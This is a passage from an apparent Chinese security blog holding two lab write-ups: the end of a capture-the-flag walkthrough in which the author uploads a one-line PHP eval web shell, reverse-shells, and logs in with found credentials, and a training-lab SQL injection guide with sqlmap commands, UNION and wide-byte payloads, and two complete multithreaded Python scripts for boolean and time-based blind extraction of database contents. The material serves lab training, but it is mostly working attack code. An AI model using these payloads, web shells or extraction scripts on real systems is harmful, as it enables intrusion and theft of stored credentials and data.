<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">Fake admin area :)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>The admin area not work :) <span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--	username : admin</span></span></span><br><span class="line"><span class="xml">	password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="xml">	The 2nd flag is : </span><span class="template-variable">&#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>The 2nd flag is : {7412574125871236547895214}</p>
<p>而且账户名是admin</p>
<p>密码是3v1l_H@ck3r</p>
<h3><span id="6找第三个flag">（6）找第三个flag</span></h3><p>在主页面输入账号密码登录进来</p>
<p><img src="/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98.assets/image-20180601203736905.png" alt="image-20180601203736905"></p>
<p>看来是个文件上传，试一下。</p>
<p>上传个php文件一句话木马</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[cmd])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>左上角显示SUCCESS，看来没什么过滤。</p>
<p>不知道上传到哪了，找一下先前禁止的目录中的/uploaded_files和/uploads</p>
<p>在/uploaded_files/yijuhua.php发现上传的一句话木马，用菜刀连接试试。不知道为什么连不上。换个大马上传下试试。上传小朋友大马再登录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.118</span><span class="regexp">/uploaded_files/</span>xiaopengyou.php</span><br></pre></td></tr></table></figure>

<p>成功连接上</p>
<p>在根目录下发现文件hint.txt.</p>
<p>里面有第三个flag</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">The <span class="number">3</span>rd flag <span class="keyword">is</span> : &#123;<span class="number">7645110034526579012345670</span>&#125;</span><br></pre></td></tr></table></figure>

<p>还有提示：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">try <span class="keyword">to</span> <span class="builtin-name">find</span><span class="built_in"> user </span>technawi password <span class="keyword">to</span> read the flag.txt file, you can <span class="builtin-name">find</span> it <span class="keyword">in</span> a hidden file ;)</span><br></pre></td></tr></table></figure>

<p>而且里面还有flag.txt，发现没有权限。看上面的权限需要找到用户technawi的密码，而且提示在一个隐藏文件中。</p>
<h3><span id="7找第四个flag">（7）找第四个flag</span></h3><p>下一关应该是相当难的，先在大马中反弹shell到自己端口上，然后利用shell进行操作。我找遍了网站下所有文件都没发现含有technawi密码的隐藏文件，因为它说是hidden file，我理解的是隐藏文件，所以一直在用ls查找。找不到了于是在全局找technawi，找半天也没找到对的，因为太多包含technawi的了。最后机智的想到是不是该找下一个flag了，按以前文件的格式应该是the 4th flag is,于是利用</p>
<p>grep “the 4th flag”    #注意时间会比价慢</p>
<p>终于在/etc/mysql/conf.d/credentials.txt文件中找出第四个flag</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">The <span class="number">4</span>th flag <span class="keyword">is</span> : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : <span class="type">technawi</span></span><br><span class="line">password : 3<span class="type">vilH</span>@ksor</span><br></pre></td></tr></table></figure>

<p>The 4th flag is : {7845658974123568974185412}   </p>
<h3><span id="7找第五个flag">（7）找第五个flag</span></h3><p>因为先前查找时已经发现flag.txt属于technawi用户，证明可以用technawi登录ssh，于是</p>
<p>ssh <a href="mailto:technawi@192.168.1.118">technawi@192.168.1.118</a></p>
<p>然后vim /var/www/html/flag.txt发现第五个flag</p>
<p>technawi</p>
<p>The 5th flag is : {5473215946785213456975249}</p>
<p>Good job :)</p>
<p>You find 5 flags and got their points and finish the first scenario….</p>
<p>到此五个flag全部找出。</p>
<p>[注]后来去网上寻找才发现直接用</p>
<p>find / -user technawi 2&gt;/dev/null 寻找更快</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_sql注入</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。</p>
<a id="more"></a>

<h2><span id="1数字型注入">1.数字型注入</span></h2><p>直接用sqlmap</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 –dbs  #列数据库信息</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 --current-db 查看当前使用的数据库</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab --tables   #查看数据库下的表名</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns --dump</span><br></pre></td></tr></table></figure>

<p>手工注入：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20f</span>rom%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20f</span>rom%<span class="number">20</span>user</span><br></pre></td></tr></table></figure>

<p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p>
<h2><span id="2字符型注入">2.字符型注入</span></h2><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="string">' 报错</span></span><br><span class="line"><span class="string">'</span><span class="meta">%</span><span class="number">23</span> 正确</span><br></pre></td></tr></table></figure>

<p>猜测为字符型注入。</p>
<p>爆库</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span>and%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20</span>from%<span class="number">20</span>user %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p>
<h2><span id="3布尔盲注">3.布尔盲注</span></h2><p>（1）判断类型</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' 不显示结果</span><br><span class="line"><span class="number">1</span>%<span class="number">27</span>%<span class="number">23</span> 正确  you are in</span><br></pre></td></tr></table></figure>

<p>根据方法判断是盲注</p>
<p>根据http response看出是布尔型</p>
<p>（2）列数</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' order by <span class="number">5</span> % <span class="number">23</span> 二分爆出列数<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>（3）脚本爆表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span></span><br><span class="line">target_url=<span class="string">"&#123;url&#125;' and &#123;payload&#125;%23"</span></span><br><span class="line">string_set = string.printable+<span class="string">',_'</span></span><br><span class="line"><span class="comment">#判断条件可以选择length,substr,regexp,left等函数</span></span><br><span class="line">value_statement=<span class="string">'(select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;) '</span></span><br><span class="line">length_statement=<span class="string">'(select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;) '</span></span><br><span class="line">MAX_LEN = <span class="number">10000</span></span><br><span class="line">ASCII_MAX = <span class="number">128</span></span><br><span class="line">TRUE_FLAG=<span class="string">"You are in"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,begin,end,column_name,table_name,where_statement)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.begin = begin</span><br><span class="line">        self.end = end</span><br><span class="line">        self.value = <span class="string">''</span></span><br><span class="line">        self.column_name = column_name</span><br><span class="line">        self.table_name = table_name</span><br><span class="line">        self.where_statement = where_statement</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        value = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> cur_index <span class="keyword">in</span> range(self.begin,self.end+<span class="number">1</span>):</span><br><span class="line">            begin = <span class="number">0</span></span><br><span class="line">            end = ASCII_MAX</span><br><span class="line">            <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">                mid = (begin+end)//<span class="number">2</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'='</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'&gt;'</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    end = mid - <span class="number">1</span></span><br><span class="line">            value += chr(begin)</span><br><span class="line">            <span class="comment">#print("value:%s"%value)</span></span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectIsTrue</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="comment">#print("url:"+target_url.format(url=url,payload=payload))</span></span><br><span class="line">    content = requests.get(target_url.format(url=url,payload=payload)).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="keyword">if</span> TRUE_FLAG <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_len</span><span class="params">(column_name,table_name,where_statement)</span>:</span> </span><br><span class="line">    begin=<span class="number">0</span></span><br><span class="line">    end=MAX_LEN</span><br><span class="line">    <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">        mid = (begin+end)//<span class="number">2</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'='</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'&gt;'</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line">    length = begin</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line">Thread_Nums=<span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(column_name,table_name,where_statement,length)</span>:</span></span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    thread_lists = []</span><br><span class="line">    task_num = length//Thread_Nums</span><br><span class="line">    <span class="keyword">if</span> length &gt;= Thread_Nums:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>,task_num):</span><br><span class="line">            cur_thread = MyThread(i,i+task_num<span class="number">-1</span>,column_name,table_name,where_statement)</span><br><span class="line">            thread_lists.append(cur_thread)</span><br><span class="line">            cur_thread.start()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cur_thread = MyThread(<span class="number">1</span>,length,column_name,table_name,where_statement)</span><br><span class="line">        thread_lists.append(cur_thread)</span><br><span class="line">        cur_thread.start()</span><br><span class="line">    <span class="keyword">for</span> cur_thread <span class="keyword">in</span> thread_lists:</span><br><span class="line">        cur_thread.join()</span><br><span class="line">        value += cur_thread.get_result()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    column_name=<span class="string">"group_concat(table_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.tables"</span></span><br><span class="line">    where_statement=<span class="string">"table_schema=database()"</span></span><br><span class="line">    <span class="comment">#判断表长度</span></span><br><span class="line">    all_table_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_table_name_len:%s"</span>%all_table_name_len)</span><br><span class="line">    <span class="comment">#找表名</span></span><br><span class="line">    all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len)</span><br><span class="line">    print(<span class="string">"all_table_name:%s"</span>%all_table_name)</span><br><span class="line">    <span class="comment">#comment,comments,emails,referers,string,user,user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断列长度</span></span><br><span class="line">    column_name=<span class="string">"group_concat(column_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.columns"</span></span><br><span class="line">    t_name = input(<span class="string">"输入要查询的表名\n"</span>)</span><br><span class="line">    where_statement=<span class="string">"table_schema=database() and table_name='&#123;t_name&#125;'"</span>.format(t_name=t_name)</span><br><span class="line">    all_column_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_column_name_len:%s"</span>%all_column_name_len)</span><br><span class="line">    all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len)</span><br><span class="line">    print(<span class="string">"all_column_name:%s"</span>%all_column_name)</span><br><span class="line"></span><br><span class="line">    c_names = input(<span class="string">"输入所有要查询的字段,以逗号分开\n"</span>).split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">for</span> c_name <span class="keyword">in</span> c_names:</span><br><span class="line">        column_name=<span class="string">"group_concat(&#123;column_name&#125;)"</span>.format(column_name=c_name)</span><br><span class="line">        table_name=t_name</span><br><span class="line">        where_statement = <span class="string">"1"</span></span><br><span class="line">        all_value_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">        print(<span class="string">"%s_length:%s"</span>%(c_name,all_value_len))</span><br><span class="line">        all_value = get_value(column_name,table_name,where_statement,all_value_len)</span><br><span class="line">        print(<span class="string">"%s_value:%s"</span>%(c_name,all_value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>username:admin password:21232f297a57a5a743894a0e4a801fc3</p>
<p>或者直接sqlmap</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B --dbs</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab --tables</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab -T<span class="built_in"> user </span>--columns</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>



<h2><span id="4时间盲注">4.时间盲注</span></h2><p>尝试</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span>' and sleep(<span class="number">3</span>) %<span class="number">23</span>   <span class="comment">//where 语句里面可以用sleep函数。</span></span><br></pre></td></tr></table></figure>

<p>发现时间延长。</p>
<p>所以可以直接用脚本爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span></span><br><span class="line">target_url=<span class="string">"&#123;url&#125;' and &#123;payload&#125;%23"</span></span><br><span class="line">string_set = string.printable+<span class="string">',_'</span></span><br><span class="line"><span class="comment">#判断条件可以选择length,substr,regexp,left等函数</span></span><br><span class="line">Sleep_Function=<span class="string">"sleep(3)"</span></span><br><span class="line">value_statement=<span class="string">'if ((select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;),'</span>+Sleep_Function+<span class="string">",1)"</span></span><br><span class="line">length_statement=<span class="string">'if ((select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;),'</span> + Sleep_Function+<span class="string">',1)'</span></span><br><span class="line">MAX_LEN = <span class="number">10000</span></span><br><span class="line">ASCII_MAX = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,begin,end,column_name,table_name,where_statement)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.begin = begin</span><br><span class="line">        self.end = end</span><br><span class="line">        self.value = <span class="string">''</span></span><br><span class="line">        self.column_name = column_name</span><br><span class="line">        self.table_name = table_name</span><br><span class="line">        self.where_statement = where_statement</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        value = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> cur_index <span class="keyword">in</span> range(self.begin,self.end+<span class="number">1</span>):</span><br><span class="line">            begin = <span class="number">0</span></span><br><span class="line">            end = ASCII_MAX</span><br><span class="line">            <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">                mid = (begin+end)//<span class="number">2</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'='</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'&gt;'</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    end = mid - <span class="number">1</span></span><br><span class="line">            value += chr(begin)</span><br><span class="line">            <span class="comment">#print("value:%s"%value)</span></span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectIsTrue</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="comment">#print("url:"+target_url.format(url=url,payload=payload))</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = requests.get(target_url.format(url=url,payload=payload),timeout=<span class="number">1</span>).content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_len</span><span class="params">(column_name,table_name,where_statement)</span>:</span> </span><br><span class="line">    begin=<span class="number">0</span></span><br><span class="line">    end=MAX_LEN</span><br><span class="line">    <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">        mid = (begin+end)//<span class="number">2</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'='</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'&gt;'</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line">    length = begin</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line">Thread_Nums=<span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(column_name,table_name,where_statement,length)</span>:</span></span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    thread_lists = []</span><br><span class="line">    task_num = length//Thread_Nums</span><br><span class="line">    <span class="keyword">if</span> length &gt;= Thread_Nums:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>,task_num):</span><br><span class="line">            cur_thread = MyThread(i,i+task_num<span class="number">-1</span>,column_name,table_name,where_statement)</span><br><span class="line">            thread_lists.append(cur_thread)</span><br><span class="line">            cur_thread.start()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cur_thread = MyThread(<span class="number">1</span>,length,column_name,table_name,where_statement)</span><br><span class="line">        thread_lists.append(cur_thread)</span><br><span class="line">        cur_thread.start()</span><br><span class="line">    <span class="keyword">for</span> cur_thread <span class="keyword">in</span> thread_lists:</span><br><span class="line">        cur_thread.join()</span><br><span class="line">        value += cur_thread.get_result()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    column_name=<span class="string">"group_concat(table_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.tables"</span></span><br><span class="line">    where_statement=<span class="string">"table_schema=database()"</span></span><br><span class="line">    <span class="comment">#判断表长度</span></span><br><span class="line">    all_table_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_table_name_len:%s"</span>%all_table_name_len)</span><br><span class="line">    <span class="comment">#找表名</span></span><br><span class="line">    all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len)</span><br><span class="line">    print(<span class="string">"all_table_name:%s"</span>%all_table_name)</span><br><span class="line">    <span class="comment">#comment,comments,emails,referers,string,user,user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断列长度</span></span><br><span class="line">    column_name=<span class="string">"group_concat(column_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.columns"</span></span><br><span class="line">    t_name = input(<span class="string">"输入要查询的表名\n"</span>)</span><br><span class="line">    where_statement=<span class="string">"table_schema=database() and table_name='&#123;t_name&#125;'"</span>.format(t_name=t_name)</span><br><span class="line">    all_column_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_column_name_len:%s"</span>%all_column_name_len)</span><br><span class="line">    all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len)</span><br><span class="line">    print(<span class="string">"all_column_name:%s"</span>%all_column_name)</span><br><span class="line"></span><br><span class="line">    c_names = input(<span class="string">"输入所有要查询的字段,以逗号分开\n"</span>).split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">for</span> c_name <span class="keyword">in</span> c_names:</span><br><span class="line">        column_name=<span class="string">"group_concat(&#123;column_name&#125;)"</span>.format(column_name=c_name)</span><br><span class="line">        table_name=t_name</span><br><span class="line">        where_statement = <span class="string">"1"</span></span><br><span class="line">        all_value_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">        print(<span class="string">"%s_length:%s"</span>%(c_name,all_value_len))</span><br><span class="line">        all_value = get_value(column_name,table_name,where_statement,all_value_len)</span><br><span class="line">        print(<span class="string">"%s_value:%s"</span>%(c_name,all_value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>username:admin password:21232f297a57a5a743894a0e4a801fc3</p>
<p>或者直接sqlmap</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T --dbs</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab --tables</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab -T<span class="built_in"> user </span>--columns</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>



<h2><span id="宽字符注入">宽字符注入</span></h2><p>输入单引号被斜杠转义，想方法把斜杠去掉，提示宽字符所以用gbk编码。第一个字节采用大于128的编码即可。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span>%<span class="number">9</span>c%<span class="number">27</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>成功绕过。直接查表</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1%9c%27 union select 1,username,password <span class="keyword">from</span><span class="built_in"> user </span>%23</span><br></pre></td></tr></table></figure>

<p>用户名： admin </p>
<p>密码： 21232f297a57a5a743894a0e4a801fc3 </p>
<p>或者sqlmap:</p>
